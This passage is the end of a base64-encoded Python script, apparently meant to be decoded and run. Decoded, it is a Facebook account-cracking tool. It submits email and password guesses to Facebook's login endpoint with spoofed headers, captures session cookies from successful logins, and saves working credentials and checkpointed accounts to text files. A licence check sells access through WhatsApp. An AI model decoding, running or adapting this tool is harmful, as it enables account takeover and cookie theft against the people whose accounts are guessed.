ICAgICAgInRyeV9udW1iZXIiOiIwIiwNCiAgICAgICAgICAgICJ1bnJlY29nbml6ZWRfdHJpZXMiOiIwIiwNCiAgICAgICAgICAgICJlbWFpbCI6dWlkLA0KICAgICAgICAgICAgInBhc3MiOnBzLA0KICAgICAgICAgICAgImxvZ2luIjoiTG9nIEluIn0NCiAgICAgICAgICAgIGhlYWRlcl9mcmVlZmIgPSB7ImF1dGhvcml0eSI6ICdwLmZhY2Vib29rLmNvbScsDQogICAgICAgICAgICAibWV0aG9kIjogJ1BPU1QnLA0KICAgICAgICAgICAgInNjaGVtZSI6ICdodHRwcycsDQogICAgICAgICAgICAiYWNjZXB0IjogJ2FwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZCcsDQogICAgICAgICAgICAiYWNjZXB0LWVuY29kaW5nIjogJ2d6aXAsIGRlZmxhdGUsIGJyJywNCiAgICAgICAgICAgICJhY2NlcHQtbGFuZ3VhZ2UiOiAnZW4tVVMsZW47cT0wLjknLA0KICAgICAgICAgICAgJ2NhY2hlLWNvbnRyb2wnOiAnbm8tY2FjaGUsIG5vLXN0b3JlLCBtdXN0LXJldmFsaWRhdGUnLA0KICAgICAgICAgICAgInJlZmVyZXIiOiAnaHR0cHM6Ly9wLmZhY2Vib29rLmNvbS8nLA0KICAgICAgICAgICAgInNlYy1jaC11YSI6ICciQ2hyb21pdW0iO3Y9IjEwNyIsICJOb3Q9QT9CcmFuZCI7dj0iMjQiJywNCiAgICAgICAgICAgICJzZWMtY2gtdWEtbW9iaWxlIjogJz8xJywNCiAgICAgICAgICAgICJzZWMtY2gtdWEtcGxhdGZvcm0iOiAiV2luZG93cyIsDQogICAgICAgICAgICAic2VjLWZldGNoLWRlc3QiOiAnZW1wdHknLA0KICAgICAgICAgICAgInNlYy1mZXRjaC1tb2RlIjogJ2NvcnMnLA0KICAgICAgICAgICAgInNlYy1mZXRjaC1zaXRlIjogJ3NhbWUtb3JpZ2luJywNCiAgICAgICAgICAgICJzZWMtZmV0Y2gtdXNlciI6ICc/MCcsDQogICAgICAgICAgICAicHJhZ21hIjogJ25vLWNhY2hlJywNCiAgICAgICAgICAgICJwcmlvcml0eSI6ICd1PTAnLA0KICAgICAgICAgICAgJ2Nyb3NzLW9yaWdpbi1yZXNvdXJjZS1wb2xpY3knOiAnY3Jvc3Mtb3JpZ2luJywNCiAgICAgICAgICAgICJ1cGdyYWRlLWluc2VjdXJlLXJlcXVlc3RzIjogJzEnLA0KICAgICAgICAgICAgInVzZXItYWdlbnQiOiBwcm99DQogICAgICAgICAgICBsbyA9IHNlc3Npb24ucG9zdCgnaHR0cHM6Ly9wLmZhY2Vib29rLmNvbS9sb2dpbi9kZXZpY2UtYmFzZWQvbG9naW4vYXN5bmMvP3JlZnNyYz1kZXByZWNhdGVkJmx3dj0xMDAnLGRhdGE9bG9nX2RhdGEsaGVhZGVycz1oZWFkZXJfZnJlZWZiKS50ZXh0DQogICAgICAgICAgICBsb2dfY29va2llcz1zZXNzaW9uLmNvb2tpZXMuZ2V0X2RpY3QoKS5rZXlzKCkNCiAgICAgICAgICAgIGlmICdjX3VzZXInIGluIGxvZ19jb29raWVzOg0KICAgICAgICAgICAgICAgIGNva2k9IjsiLmpvaW4oW2tleSsiPSIrdmFsdWUgZm9yIGtleSx2YWx1ZSBpbiBzZXNzaW9uLmNvb2tpZXMuZ2V0X2RpY3QoKS5pdGVtcygpXSkNCiAgICAgICAgICAgICAgICBjaWQgPSBjb2tpWzc6MjJdDQogICAgICAgICAgICAgICAgcHJpbnQoJ1xyXHJcMDMzWzE7MzJtIFvhpazwn5iI4a2E8J2QjfCdkIDwnZCH8J2QiPCdkIMg8J+YiOGthOqTp9mc2ZzZnNmc2ZzZnNmc2ZzZnNmc2ZzZnNmc2ZzZnNmc2ZzZnNmc2Zzqk6XZnNmc2ZzZnNmc2ZzZnNmc2ZzZnNmc2ZzZnNmc2ZzZnOqTmtmc2ZzZnNmc2ZzZnNmc2ZzZnNmc2ZzZnOqTl9mc2ZzZnNmc2ZzZnNmc2Zzqk7DZnNmc2ZzZnOqTo9mcLU9L8J+SiV0gJyArY2lkKyAnIHwgJyArcHMrICAgICcgIFxuIFwwMzNbMTszM21Db29raWUg8J+Nqj0gXDAzM1sxOzMybScrY29raSsgICcgICcnICBcMDMzWzA7OTdtJykNCiAgICAgICAgICAgICAgICBjZWtfYXBrKHNlc3Npb24sY29raSkNCiAgICAgICAgICAgICAgICBvcGVuKCcvc2RjYXJkL+GlrPCfmIjhrYTwnZCN8J2QgPCdkIfwnZCI8J2QgyDwn5iI4a2E6pOn2ZzZnNmc2ZzZnNmc2ZzZnNmc2ZzZnNmc2ZzZnNmc2ZzZnNmc2ZzZnOqTpdmc2ZzZnNmc2ZzZnNmc2ZzZnNmc2ZzZnNmc2ZzZnNmc6pOa2ZzZnNmc2ZzZnNmc2ZzZnNmc2ZzZnNmc6pOX2ZzZnNmc2ZzZnNmc2ZzZnOqTsNmc2ZzZnNmc6pOj2ZwtT0sudHh0JywgJ2EnKS53cml0ZSggdWlkKycgfCAnK3BzKydcbicpDQogICAgICAgICAgICAgICAgb2tzLmFwcGVuZChjaWQpDQogICAgICAgICAgICAgICAgYnJlYWsNCiAgICAgICAgICAgIGVsaWYgJ2NoZWNrcG9pbnQnIGluIGxvZ19jb29raWVzOg0KICAgICAgICAgICAgICAgIGNva2k9IjsiLmpvaW4oW2tleSsiPSIrdmFsdWUgZm9yIGtleSx2YWx1ZSBpbiBzZXNzaW9uLmNvb2tpZXMuZ2V0X2RpY3QoKS5pdGVtcygpXSkNCiAgICAgICAgICAgICAgICBjaWQgPSBjb2tpWzI0OjM5XQ0KICAgICAgICAgICAgICAgICNwcmludCgnXHJcclwzM1sxOzMxbSBb4aWs8J+YiOGthPCdkI3wnZCA8J2Qh/CdkIjwnZCDIPCfmIjhrYTqk6fZnNmc2ZzZnNmc2ZzZnNmc2ZzZnNmc2ZzZnNmc2ZzZnNmc2ZzZnNmc6pOl2ZzZnNmc2ZzZnNmc2ZzZnNmc2ZzZnNmc2ZzZnNmc2Zzqk5rZnNmc2ZzZnNmc2ZzZnNmc2ZzZnNmc2Zzqk5fZnNmc2ZzZnNmc2ZzZnNmc6pOw2ZzZnNmc2Zzqk6PZnC1DUPCfkpRdICcgK3VpZCsgJyB8ICcgK3BzKyAgICAgICAgICAgJyAgXDMzWzA7OTdtJykNCiAgICAgICAgICAgICAgICBvcGVuKCcvc2RjYXJkL+GlrPCfmIjhrYTwnZCN8J2QgPCdkIfwnZCI8J2QgyDwn5iI4a2E6pOn2ZzZnNmc2ZzZnNmc2ZzZnNmc2ZzZnNmc2ZzZnNmc2ZzZnNmc2ZzZnOqTpdmc2ZzZnNmc2ZzZnNmc2ZzZnNmc2ZzZnNmc2ZzZnNmc6pOa2ZzZnNmc2ZzZnNmc2ZzZnNmc2ZzZnNmc6pOX2ZzZnNmc2ZzZnNmc2ZzZnOqTsNmc2ZzZnNmc6pOj2ZwtQ1AudHh0JywgJ2EnKS53cml0ZSggdWlkKycgfCAnK3BzKycgXG4nKQ0KICAgICAgICAgICAgICAgIGNwcy5hcHBlbmQoY2lkKQ0KICAgICAgICAgICAgICAgIGJyZWFrDQogICAgICAgICAgICBlbHNlOg0KICAgICAgICAgICAgICAgIGNvbnRpbnVlDQogICAgICAgIGxvb3ArPTENCiAgICAgICAgc3lzLnN0ZG91dC53cml0ZShmJ1xyXHIlcyB7eH1be3hyfeGlrPCfmIjhrYTwnZCN8J2QgPCdkIfwnZCI8J2QgyDwn5iI4a2E6pOn2ZzZnNmc2ZzZnNmc2ZzZnNmc2ZzZnNmc2ZzZnNmc2ZzZnNmc2ZzZnOqTpdmc2ZzZnNmc2ZzZnNmc2ZzZnNmc2ZzZnNmc2ZzZnNmc6pOa2ZzZnNmc2ZzZnNmc2ZzZnNmc2ZzZnNmc6pOX2ZzZnNmc2ZzZnNmc2ZzZnOqTsNmc2ZzZnNmc6pOj2Zwge3h9XVslc3wlc11bT0s6e3hyfSVze3h9XSclKEgsbG9vcCx0bCxsZW4ob2tzKSkpLA0KICAgICAgICBzeXMuc3Rkb3V0LmZsdXNoKCkNCiAgICBleGNlcHQ6DQogICAgICAgIHBhc3MNCg0KDQpkZWYgYXBwcm92YWwoKToNCiAgb3Muc3lzdGVtKCdjbGVhcicpDQogIHByaW50KGxvZ28pDQogIHV1aWQgPSBzdHIob3MuZ2V0ZXVpZCgpKSArIHN0cihvcy5nZXRsb2dpbigpKQ0KICBpZCA9ICItIi5qb2luKHV1aWQpDQogIHRyeToNCiAgICBodHRwQ2FodCA9IHJlcXVlc3RzLmdldCgnaHR0cHM6Ly9naXRodWIuY29tL21lbnRhbG5haGlkLTI5OTk5L2NvbnRvbHBhbmVsL2Jsb2IvbWFpbi9uYWhpZC50eHQnKS50ZXh0DQogICAgaWYgaWQgaW4gaHR0cENhaHQ6DQogICAgICBwcmludCgiXDMzWzE7MzJtWW91ciBUb2tlbiBpcyBTdWNjZXNzZnVsbHkgQXBwcm92ZWQiKQ0KICAgICAgbXNnID0gc3RyKG9zLmdldGV1aWQoKSkNCiAgICAgIHRpbWUuc2xlZXAoMC41KQ0KICAgICAgeHhyKCkNCiAgICAgIHBhc3MNCiAgICBlbHNlOg0KICAgICAgcHJpbnQoIllvdXIgVG9rZW4gOiAiK2lkKQ0KICAgICAgcHJpbnQoJ1wzM1sxOzM3bS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0nKQ0KICAgICAgcHJpbnQoIlwzM1sxOzMybUltcG9ydGFudCBOb3RlIikNCiAgICAgIHByaW50KCJcMzNbMTszN20tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tIikNCiAgICAgIHByaW50KCJcMzNbMTszN21Gb3IgMTUgRGF5cyBBcHByb3ZhbCBQcmljZSA0MDAgIE9uZSBNb250aCBQcmljZSIpDQogICAgICBwcmludCgnNjAwIEVhc3lwYWlzYSBZYSBLYWlzZSBCZSBBY2Mgc3kgcGF5bWVudCBrYXIga2EnKQ0KICAgICAgcHJpbnQoJ1BheSBraSBzcyBhZG1pbiBrbyBzZW50IGthcmEgZnJlZSB3YWxhIGRvb3IgcmFob28nKQ0KICAgICAgcHJpbnQoJ1wzM1sxOzM3bS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0nKQ0KICAgICAgcHJpbnQgKCdJRiBVIERPTlQgV0FOVCBUTyBCVVkgUExTIERPTlQgUFJFU1MgRU5URVInKQ0KICAgICAgaW5wdXQoJ0lGIFUgV0FOVCBUTyBCVVkgVEhFTiBQUkVTUyBFTlRFUiAnKQ0KICAgICAgdGtzID0gKCdIZWxsbyUyMFNpciUyMCElMjBQbGVhc2UlMjBBcHByb3ZlJTIwTXklMjBUb2tlbiUyMFRoZSUyMFRva2VuJTIwSXMlMjA6JTIwJytpZCk7b3Muc3lzdGVtKCdhbSBzdGFydCBodHRwczovL3dhLm1lLys4ODAxMzAzNjM3NzUyP3RleHQ9Jyt0a3MpLGFwcHJvdmFsKCkNCiAgICAgIHRpbWUuc2xlZXAoMSkNCiAgICAgIGFwcHJvdmFsKCkNCiAgZXhjZXB0Og0KICAgIHN5cy5leGl0KCkNCg0KDQoNCmFwcHJvdmFsKCk="))
